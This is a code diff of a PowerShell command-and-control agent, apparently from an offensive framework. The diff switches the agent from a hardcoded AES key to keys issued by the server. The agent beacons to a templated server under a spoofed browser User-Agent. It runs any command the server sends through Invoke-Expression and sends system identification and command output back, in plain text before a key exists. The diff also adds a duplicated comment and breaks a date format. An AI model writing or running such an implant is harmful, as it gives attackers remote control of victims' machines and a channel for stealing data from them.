@@ -1,11 +1,8 @@
 # Kinetic Compliance Matrix - PowerShell Agent with Dynamic Path Rotation
-# This agent contains encryption functionality, system identification, and path rotation
+# This agent uses a secure key exchange mechanism and supports path rotation
 
 # Set TLS 1.2 for compatibility
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# Encryption key
-$key = [System.Convert]::FromBase64String('{{KEY_BASE64}}')
 
 # Server details
 $serverAddress = '{{SERVER_ADDRESS}}'
@@ -16,11 +13,20 @@ $commandResultPath = '{{CMD_RESULT_PATH}}'
 $fileUploadPath = '{{FILE_UPLOAD_PATH}}'
 $fileRequestPath = '{{FILE_REQUEST_PATH}}'
 
+# Initialize encryption key as null - will be obtained from server
+$global:encryptionKey = $null
+
 {{PATH_ROTATION_CODE}}
 
 # Function to encrypt data for C2 communication
 function Encrypt-Data {
     param([string]$PlainText)
+    
+    # Check if we have an encryption key yet
+    if ($null -eq $global:encryptionKey) {
+        # Return plaintext if no encryption key available yet
+        return $PlainText
+    }
     
     # Convert to bytes
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
@@ -45,7 +51,7 @@ function Encrypt-Data {
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
-    $aes.Key = $key
+    $aes.Key = $global:encryptionKey
     $aes.IV = $iv
     
     $encryptor = $aes.CreateEncryptor()
@@ -64,30 +70,63 @@ function Encrypt-Data {
 function Decrypt-Data {
     param([string]$EncryptedBase64)
     
-    # Decode base64
-    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
+    # Check if we have an encryption key yet
+    if ($null -eq $global:encryptionKey) {
+        # Return the data as-is if no encryption key available yet
+        return $EncryptedBase64
+    }
     
-    # Extract IV and ciphertext
-    $iv = $encryptedBytes[0..15]
-    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
+    try {
+        # Decode base64
+        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
+        
+        # Extract IV and ciphertext
+        $iv = $encryptedBytes[0..15]
+        $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
+        
+        # Create AES decryptor
+        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $aes.Key = $global:encryptionKey
+        $aes.IV = $iv
+        
+        # Decrypt
+        $decryptor = $aes.CreateDecryptor()
+        $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+        
+        # Remove padding
+        $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
+        $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
+        
+        # Convert to string
+        return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
+    }
+    catch {
+        # If decryption fails, it could be an initial exchange or invalid data
+        # Just return the original input
+        return $EncryptedBase64
+    }
+}
+
+# Function to handle key issuance or rotation
+function Update-EncryptionKey {
+    param([string]$Base64Key)
     
-    # Create AES decryptor
-    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
-    $aes.Key = $key
-    $aes.IV = $iv
-    
-    # Decrypt
-    $decryptor = $aes.CreateDecryptor()
-    $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
-    
-    # Remove padding
-    $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
-    $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
-    
-    # Convert to string
-    return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
+    try {
+        # Convert the Base64 key to a byte array
+        $newKey = [System.Convert]::FromBase64String($Base64Key)
+        
+        # Set the global encryption key
+        $global:encryptionKey = $newKey
+        
+        Write-Host "Encryption key updated successfully"
+        return $true
+    }
+    catch {
+        Write-Host "Error updating encryption key: $_"
+        return $false
+    }
 }
 
 # Function to gather system identification information
@@ -303,6 +342,9 @@ function Get-DirectoryListing {
 }
 
 # Function to process commands from the C2 server
+# Function to process commands from the C2 server
+# Function to process commands from the C2 server
+# Function to process commands from the C2 server
 function Process-Commands {
     param([array]$Commands)
     
@@ -320,14 +362,87 @@ function Process-Commands {
         try {
             $result = ""
             
-            if ($commandType -eq "execute") {
+            # Handle key issuance and rotation commands first
+            if ($commandType -eq "key_issuance") {
+                # Initial key setup from server
+                $success = Update-EncryptionKey -Base64Key $args
+                $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
+                
+                # Send the result back to C2 - this will be the first encrypted communication
+                $resultObj = @{
+                    timestamp = $timestamp
+                    result = $result
+                }
+                
+                # First prepare the JSON
+                $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
+                
+                # Create a web client for result submission
+                $resultClient = New-Object System.Net.WebClient
+                
+                # Get fresh system info after key update
+                $systemInfo = Get-SystemIdentification
+                $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
+                $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
+                
+                # Add essential headers
+                $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+                $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                $resultClient.Headers.Add("Content-Type", "application/json")
+    
+                # Try to send the result - with retry mechanism
+                $maxRetries = 3
+                $currentRetry = 0
+                $sendSuccess = $false
+                
+                while (-not $sendSuccess -and $currentRetry -lt $maxRetries) {
+                    try {
+                        # Use the initial command result path
+                        $resultUrl = "http://$serverAddress$commandResultPath"
+                        Write-Host "Sending key issuance result to $resultUrl (attempt $($currentRetry+1))"
+                        
+                        # First try with minimal encryption
+                        if ($currentRetry -eq 0) {
+                            # On first attempt, send with minimal headers
+                            $resultClient.Headers["X-System-Info"] = $systemInfo  # Send unencrypted system info
+                            $resultClient.UploadString($resultUrl, $resultJson)  # Send unencrypted result
+                        }
+                        # On subsequent retries, try with encryption
+                        else {
+                            $resultClient.Headers["X-System-Info"] = $encryptedSystemInfo
+                            $encryptedResult = Encrypt-Data -PlainText $resultJson
+                            $resultClient.UploadString($resultUrl, $encryptedResult)
+                        }
+                        
+                        $sendSuccess = $true
+                        Write-Host "Key issuance result sent successfully"
+                    }
+                    catch {
+                        $currentRetry++
+                        Write-Host "Error sending key issuance result (attempt $currentRetry): $_"
+                        Start-Sleep -Seconds 1  # Brief pause before retry
+                    }
+                }
+                
+                # Continue to the next command
+                continue
+            }
+            elseif ($commandType -eq "key_rotation") {
+                # Handle key rotation command from operator
+                $success = Update-EncryptionKey -Base64Key $args
+                $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
+            }
+            elseif ($commandType -eq "execute") {
                 # Execute shell command
                 try {
                     # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
+                    Write-Host "Executing command: $args"
                     $result = Invoke-Expression -Command $args | Out-String
+                    Write-Host "Command execution completed"
                 }
                 catch {
                     $result = "Error executing command: $_"
+                    Write-Host $result
                 }
             }
             elseif ($commandType -eq "upload") {
@@ -373,18 +488,6 @@ function Process-Commands {
                 $detailedInfo = Get-SystemIdentification
                 $result = $detailedInfo
             }
-            elseif ($commandType -eq "key_rotation") {
-                # Handle key rotation command from operator
-                # Get the new key from args
-                try {
-                    $newKey = [System.Convert]::FromBase64String($args)
-                    $global:key = $newKey
-                    $result = "Key rotation successful - using new encryption key"
-                }
-                catch {
-                    $result = "Key rotation failed: $_"
-                }
-            }
             elseif ($commandType -eq "path_rotation") {
                 # Handle path rotation command
                 try {
@@ -429,7 +532,15 @@ function Process-Commands {
             }
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
-            $resultClient.UploadString($resultUrl, $encryptedResult)
+            
+            Write-Host "Sending command result to $resultUrl"
+            try {
+                $resultClient.UploadString($resultUrl, $encryptedResult)
+                Write-Host "Command result sent successfully"
+            }
+            catch {
+                Write-Host "Error sending command result: $_"
+            }
         }
         catch {
             # Send the error as a result
@@ -457,7 +568,15 @@ function Process-Commands {
             }
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
-            $resultClient.UploadString($resultUrl, $encryptedResult)
+            
+            Write-Host "Sending error result to $resultUrl"
+            try {
+                $resultClient.UploadString($resultUrl, $encryptedResult)
+                Write-Host "Error result sent successfully"
+            }
+            catch {
+                Write-Host "Error sending command error result: $_"
+            }
         }
     }
 }
@@ -491,8 +610,21 @@ function Process-ServerResponseHeaders {
         
         if ($nextRotation -and [int]$nextRotation -ne $global:nextRotationTime) {
             $global:nextRotationTime = [int]$nextRotation
-            Write-Host "Next rotation time updated: $([DateTimeOffset]::FromUnixTimeSeconds($global:nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
+            Write-Host "Next rotation time updated: $([DateTimeOffset]::FromUnixTimeSeconds($global:nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:MM:ss'))"
         }
+    }
+    
+    # Check for key operation headers
+    if ($WebClient.ResponseHeaders["X-First-Contact"] -eq "true") {
+        Write-Host "First contact with server established - key exchange in progress"
+    }
+    
+    if ($WebClient.ResponseHeaders["X-Key-Issuance"] -eq "true") {
+        Write-Host "Key issuance indicated in response"
+    }
+    
+    if ($WebClient.ResponseHeaders["X-Key-Rotation"] -eq "true") {
+        Write-Host "Key rotation indicated in response"
     }
 }
 
@@ -528,8 +660,9 @@ function Start-AgentLoop {
             # Create web client for C2 communication
             $webClient = New-Object System.Net.WebClient
             
-            # Add system info in encrypted form
-            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
+            # Add system info - encrypted if we have a key, otherwise plaintext
+            $systemInfoRaw = Get-SystemIdentification
+            $encryptedSystemInfo = if ($null -eq $global:encryptionKey) { $systemInfoRaw } else { Encrypt-Data -PlainText $systemInfoRaw }
             $webClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
             
             # Add client ID
@@ -555,22 +688,45 @@ function Start-AgentLoop {
             
             # Beacon to the C2 server
             Write-Host "[$hostname] Beaconing to $beaconUrl"
-            $encryptedResponse = $webClient.DownloadString($beaconUrl)
+            $response = $webClient.DownloadString($beaconUrl)
             
-            # Process response headers for path rotation updates
+            # Process response headers for path rotation updates and key operations
             Process-ServerResponseHeaders -WebClient $webClient
             
             # Reset failure counter on successful connection
             $consecutiveFailures = 0
             $usingFallbackPaths = $false
             
-            # Decrypt and process response if not empty
-            if ($encryptedResponse.Length -gt 0) {
-                $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
-                $commands = ConvertFrom-Json -InputObject $decryptedResponse
+            # Process response if not empty
+            if ($response.Length -gt 0) {
+                # Check for special header that indicates first contact/key issuance
+                $isFirstContact = $webClient.ResponseHeaders["X-First-Contact"] -eq "true"
                 
-                # Process commands
-                Process-Commands -Commands $commands
+                # If it's first contact, the response is not encrypted
+                if ($isFirstContact) {
+                    # Parse directly as JSON
+                    try {
+                        $commands = ConvertFrom-Json -InputObject $response
+                        # Process commands will handle key issuance
+                        Process-Commands -Commands $commands
+                    }
+                    catch {
+                        Write-Host "Error parsing first contact response: $_"
+                    }
+                }
+                else {
+                    # For established sessions, decrypt the response
+                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
+                    
+                    # Parse the decrypted response
+                    try {
+                        $commands = ConvertFrom-Json -InputObject $decryptedResponse
+                        Process-Commands -Commands $commands
+                    }
+                    catch {
+                        Write-Host "Error parsing decrypted response: $_"
+                    }
+                }
             }
         }
         catch {
@@ -600,6 +756,5 @@ function Start-AgentLoop {
         Start-Sleep -Seconds $actualInterval
     }
 }
-
 # Start the agent
 Start-AgentLoop
